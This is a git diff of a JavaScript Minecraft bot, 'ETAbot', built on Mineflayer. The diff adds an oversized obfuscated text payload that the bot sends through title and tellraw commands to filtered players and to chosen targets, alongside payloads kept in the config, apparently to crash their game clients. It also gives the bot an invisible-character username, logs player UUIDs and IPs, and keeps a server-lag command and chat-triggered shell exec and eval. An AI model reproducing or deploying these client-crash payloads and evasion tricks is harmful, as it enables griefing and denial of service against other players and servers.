@@ -4,12 +4,12 @@ const { Tellraw, Text } = require("./util/tellrawBuilder.js");
 const { selfcare } = require('./util/selfcare.js');
 const readline = require('readline');
 const fs = require('fs');
-const msu = require('minecraft-server-util');
 const os = require('os');
 const config = JSON.parse(fs.readFileSync('./config.json','utf8'));
 const { host, port, ver } = config.bot;
 const { titlePayload, obfuscatePayload } = config.exploits;
 const { exec } = require("child_process");
+const utfPayload = "e\u00a7k" + "猫".repeat(31500) + "\u00a7rrekt";
 require('./util/colorcodes.js');
 
 
@@ -59,6 +59,20 @@ class MinecraftBot {
         ).join('');
     }
 
+    generateInvis(length) {
+        const invisChars = [
+            '\u200C', // zero width non-joiner
+            '\u00A7'  // section sign
+        ];
+
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            result += invisChars[Math.floor(Math.random() * invisChars.length)];
+        }
+        return result;
+    }
+
+
     generateInitialHashes() {
         this.bot.trustedHash = this.generateRandom(Math.floor(Math.random() * (15 - 10) + 10));
         this.bot.ownerHash = this.generateRandom(Math.floor(Math.random() * (25 - 20) + 20));
@@ -90,7 +104,7 @@ class MinecraftBot {
         this.bot = mineflayer.createBot({
             host: host,
             port: port,
-            username: `<${this.generateRandom(4)}]+[${this.generateRandom(4)}>`,
+            username: `${this.generateInvis(4)}`,
             version: ver,
             physicsEnabled: false
         });
@@ -98,6 +112,7 @@ class MinecraftBot {
         this.setupEventHandlers();
         this.registerCommands();
         this.generateInitialHashes();
+        this.knownPlayers = new Map()
     }
 
     setupEventHandlers() {
@@ -106,6 +121,14 @@ class MinecraftBot {
         this.bot.on('error', (err) => console.error('Error:', err));
         this.bot.on('end', () => console.log('Bot has disconnected.'));
         this.bot.on('message', (jsonMsg) => console.log(`<server> ${jsonMsg.toString()}`));
+        this.bot.on('playerJoined', (player) => {
+            if (!player || !player.uuid) return
+            this.knownPlayers.set(player.uuid, player.username)
+        })
+        this.bot.on('playerUpdated', (player) => {
+            if (!player || !player.uuid) return
+            this.knownPlayers.set(player.uuid, player.username)
+        })
     }
 
     handleLogin() {
@@ -113,7 +136,6 @@ class MinecraftBot {
             this.bot.pos = this.bot.entity.position;
             this.bot.core = new CoreClass(this.bot);
             this.handlePrefixCommand();
-            selfcare(this.bot);
 
             setTimeout(() => {
                 const tipsNstuff = [
@@ -126,52 +148,58 @@ class MinecraftBot {
 
                 setInterval(() => {
                     const tip = tipsNstuff[Math.floor(Math.random() * tipsNstuff.length)];
-                    this.bot.chat(`/bcraw &r&8[&2ETAbot &aTips&8]&7: ${tip}`);
+                    this.bot.core.run(`/bcraw &r&8[&2ETAbot &aTips&8]&7: ${tip}`);
                 }, 5 * 60 * 1000);
                 
                 if (filtering) {
-                    this.bot.chat("/bcraw &aFilter enabled");
+                    this.bot.core.run("/bcraw &aFilter enabled");
                     filterInterval = setInterval(() => {
-                        let players = JSON.parse(fs.readFileSync("filter.json", "utf8"));
+                        const players = JSON.parse(fs.readFileSync("filter.json", "utf8"));
 
                         for (let name of Object.keys(this.bot.players)) {
-                            const entry = players.find(p => {
-                                if (Array.isArray(p.id)) {
-                                    return p.id.some(pattern => {
-                                        let regex = new RegExp(
-                                            pattern.replace(/\*\*\*\((\d+)\)\*\*\*/g, '.{$1}').replace(/\*/g, '.*')
-                                        );
-                                        return regex.test(name);
-                                    });
-                                } else {
-                                    let regex = new RegExp(
-                                        p.id.replace(/\*\*\*\((\d+)\)\*\*\*/g, '.{$1}').replace(/\*/g, '.*')
+                            const p = this.bot.players[name];
+                            if (!p) continue;
+
+                            const entry = players.find(rule => {
+                                const ids = Array.isArray(rule.id) ? rule.id : [rule.id];
+                                return ids.some(pattern => {
+                                    if (p.uuid && pattern === p.uuid) return true;
+
+                                    if (p.ip && pattern === p.ip) return true;
+
+                                    const regex = new RegExp(
+                                        pattern.replace(/\*\*\*\((\d+)\)\*\*\*/g, '.{$1}').replace(/\*/g, '.*')
                                     );
                                     return regex.test(name);
-                                }
+                                });
                             });
 
                             if (entry) {
                                 const reason = entry.reason || "filtered";
 
-                                this.bot.core.run(`/deop ${name}`);
-                                this.bot.core.run(`/sudo ${name} prefix &8[&4&lFiltered &c- &4&l${reason}&8]`);
-                                this.bot.core.run(`/sudo ${name} c:ive been filtered for reason ${reason}`);
-                                this.bot.core.run(`/sudo ${name} vanish off`);
-                                this.bot.core.run(`/sudo ${name} god off`);
-                                this.bot.core.run(`/sudo ${name} cspy off`);
+                                this.bot.core.run(`/deop @a[name="${name}"]`);
+                                this.bot.core.run(`/sudo @a[name="${name}"] prefix &8[&4&lFiltered &c- &4&l${reason}&8]`);
+                                this.bot.core.run(`/sudo @a[name="${name}"] c:ive been filtered for reason ${reason}`);
+                                this.bot.core.run(`/sudo @a[name="${name}"] vanish off`);
+                                this.bot.core.run(`/sudo @a[name="${name}"] god off`);
+                                this.bot.core.run(`/sudo @a[name="${name}"] cspy off`);
                                 this.bot.core.run(`/bcraw &cETAbot Core &6has muted player &c${name}&6 for &c1337 centuries&6. Reason: &c${reason}`);
-                                this.bot.core.run(`/msg ${name} you've been filtered: ${reason}`);
-                                this.bot.core.run(`/title ${name} actionbar ${titlePayload}`);
+                                this.bot.core.run(`/msg @a[name="${name}"] you've been filtered: ${reason}`);
                                 this.bot.core.run(`/console Dang that guy sucks`);
-                                this.bot.core.run(`/title ${name} title ${titlePayload}`);
-                                this.bot.core.run(`/title ${name} subtitle ${titlePayload}`);
-                                this.bot.core.run(`/tellraw ${name} ${titlePayload}`);
+                                this.bot.core.run(`/title ${name} title "${utfPayload}"`);
+                                this.bot.core.run(`/title @a[name="${name}"] actionbar ${config.exploits.translatePayload}`);
+                                this.bot.core.run(`/title @a[name="${name}"] title ${config.exploits.translatePayload}`);
+                                this.bot.core.run(`/title @a[name="${name}"] subtitle ${config.exploits.translatePayload}`);
+                                this.bot.core.run(`/tellraw @a[name="${name}"] ${config.exploits.translatePayload}`);
+                                this.bot.core.run(`/title @a[name="${name}"] actionbar ${config.exploits.titlePayload}`);
+                                this.bot.core.run(`/title @a[name="${name}"] title ${config.exploits.titlePayload}`);
+                                this.bot.core.run(`/title @a[name="${name}"] subtitle ${config.exploits.titlePayload}`);
+                                this.bot.core.run(`/tellraw @a[name="${name}"] ${config.exploits.titlePayload}`);
                             }
                         }
-                    }, 500);
+                    }, 1000);
                 } else {
-                    this.bot.chat("/bcraw &cFilter disabled");
+                    this.bot.core.run("/bcraw &cFilter disabled");
                     clearInterval(filterInterval);
                 }
             }, 350);
@@ -187,7 +215,6 @@ class MinecraftBot {
                 .add(new Text("§l\\\\refill§r ").color("white"))
                 .add(new Text("§l\\\\uuids§r ").color("white"))
                 .add(new Text("§l\\\\fibonacci§r ").color("white"))
-                .add(new Text("§l\\\\annoy§r ").color("white"))
                 .add(new Text("§l\\\\core§r ").color("white"))
                 .add(new Text("§l\\\\joke§r ").color("white"))
                 .add(new Text("§l\\\\system§r ").color("white"))
@@ -204,16 +231,6 @@ class MinecraftBot {
                 .add(new Text("§l\\\\testbot§r ").color("yellow"))
                 .add(new Text("§l\\\\testchat§r ").color("yellow"))
             this.bot.core.fancyTellraw(helpMessage.get());
-        });
-
-        this.commands.set('annoy', () => {
-            this.bot.core.run('tp @e[type=player] ETAGamer');
-            this.bot.core.run('sudo * v off');
-            this.bot.core.run('effect give @a minecraft:blindness 2 10 true');
-        });
-
-        this.commands.set('testlmao', () => {
-            this.bot.core.run(`/tellraw ETAGamer {"text":"","extra":[{"translate":"chat.type.text","with":[{"text":"\\u00A7l\\u00A7nHacked by etabot"}]}]}`);
         });
 
         this.commands.set('core', (args) => {
@@ -305,7 +322,7 @@ class MinecraftBot {
 
             if (hash !== this.bot.ownerHash) {
                 console.log("Wrong hash");
-                return this.bot.chat("/bcraw &c&lWrong Owner hash.");
+                return this.bot.core.run("/bcraw &c&lWrong Owner hash.");
             }
 
             this.generateNewHash(args[0] === this.bot.ownerHash ? "owner" : "trusted");
@@ -443,12 +460,14 @@ class MinecraftBot {
 
         this.commands.set('echo', (args) => {
             if (args.join(" ").includes('\\echo')) {
-                return this.bot.chat("/bcraw &cah ah ah no recursion");
+                return this.bot.core.run("/bcraw &cah ah ah no recursion");
+            } else if (args.join(" ").includes('/')) {
+                return this.bot.core.run("/bcraw &cah ah ah no commands");
             }
             this.bot.chat(args.join(" "));
         });
 
-        this.commands.set('verysecretconsolecmd', (args) => {
+        this.commands.set('verysecretconsolecmd', () => {
             exec("node index.js")
         });
 
@@ -457,12 +476,12 @@ class MinecraftBot {
 
             if (hash !== this.bot.ownerHash) {
                 console.log("Wrong hash");
-                return this.bot.chat("/bcraw &c&lWrong Owner hash.");
+                return this.bot.core.run("/bcraw &c&lWrong Owner hash.");
             }
 
             this.generateNewHash(args[0] === this.bot.ownerHash ? "owner" : "trusted");
 
-            if (!args[1].length) return this.bot.chat("/bc&cNo bash command provided.");
+            if (!args[1].length) return this.bot.chat("/bcraw &cNo bash command provided.");
 
             const command = args[1]
 
@@ -488,7 +507,7 @@ class MinecraftBot {
 
             if (hash !== this.bot.ownerHash) {
                 console.log("Wrong hash");
-                return this.bot.chat("/bc&c&lWrong Owner hash.");
+                return this.bot.core.run("/bcraw &c&lWrong Owner hash.");
             }
 
             this.generateNewHash(args[0] === this.bot.ownerHash ? "owner" : "trusted");
@@ -496,9 +515,9 @@ class MinecraftBot {
             try {
                 const code = args[1]
                 const result = eval(code);
-                this.bot.chat(`/bcraw &aResult: &r${result}`);
+                this.bot.core.run(`/bcraw &aE &7⏩ &2Result: &r${result}`);
             } catch (err) {
-                this.bot.chat(`/bcraw &cError: &r${err.message}`);
+                this.bot.core.run(`/bcraw &aE &7⏩ &cError: &r${err.message}`);
             }
         });
 
@@ -536,11 +555,12 @@ class MinecraftBot {
 
             if (hash !== this.bot.ownerHash) {
                 console.log("Wrong hash");
-                return this.bot.chat("/bcraw &c&lWrong Owner hash.");
+                return this.bot.core.run("/bcraw &c&lWrong Owner hash.");
             }
 
             this.generateNewHash(args[0] === this.bot.ownerHash ? "trusted" : "owner");
 
+            this.bot.core.run(`/title ${target} title "${utfPayload}"`);
             this.bot.core.run(`/title ${target} actionbar ${config.exploits.translatePayload}`);
             this.bot.core.run(`/title ${target} title ${config.exploits.translatePayload}`);
             this.bot.core.run(`/title ${target} subtitle ${config.exploits.translatePayload}`);
@@ -556,7 +576,7 @@ class MinecraftBot {
 
             if (hash !== this.bot.ownerHash) {
                 console.log("Wrong hash");
-                return this.bot.chat("/bcraw &c&lWrong Owner hash.");
+                return this.bot.core.run("/bcraw &c&lWrong Owner hash.");
             }
 
             this.generateNewHash(args[0] === this.bot.ownerHash ? "trusted" : "owner");
@@ -574,19 +594,24 @@ class MinecraftBot {
         });
 
         this.commands.set('uuids', () => {
-            Object.keys(this.bot.players).forEach(name => {
-                const uuid = this.bot.players[name].uuid
+            for (const [name, p] of Object.entries(this.bot.players)) {
+                if (p && p.uuid) {
+                    this.knownPlayers.set(p.uuid, name)
+                }
+            }
+
+            for (const [uuid, name] of this.knownPlayers.entries()) {
                 const msg = new Tellraw()
                     .add(new Text(`${name}: `).color('dark_green'))
                     .add(new Text(uuid).color('gray'))
                 this.bot.core.fancyTellraw(msg.get())
-            })
+            }
         })
 
         this.commands.set('lagserver', (args) => {
             if (args[0] !== this.bot.trustedHash && args[0] !== this.bot.ownerHash) {
                 console.log("Wrong hash");
-                return this.bot.chat("/bcraw &cWrong Trusted or Owner hash.")
+                return this.core.run("/bcraw &cWrong Trusted or Owner hash.")
             }
 
             this.generateNewHash(args[0] === this.bot.trustedHash ? "trusted" : "owner");
@@ -686,11 +711,12 @@ class MinecraftBot {
     handlePrefixCommand() {
         const commands = [
             () => this.bot.chat('/prefix &8[&2&l\\\\&ahelp&8]', this.prefix),
-            () => this.bot.chat('/username &7&lETA&7b�t'),
+            () => this.bot.chat('/nick &7&lETA&7b�t'),
             () => this.bot.chat('/skin ETAGamer'),
             () => this.bot.chat('/vanish on'),
-            () => this.bot.chat('/cspy on'),
-            () => this.bot.chat('/god on')
+            () => this.bot.chat('/commandspy on'),
+            () => this.bot.chat('/godmode on'),
+            () => this.bot.chat('/socialspy on')
         ];
 
         commands.forEach((cmd, index) => {
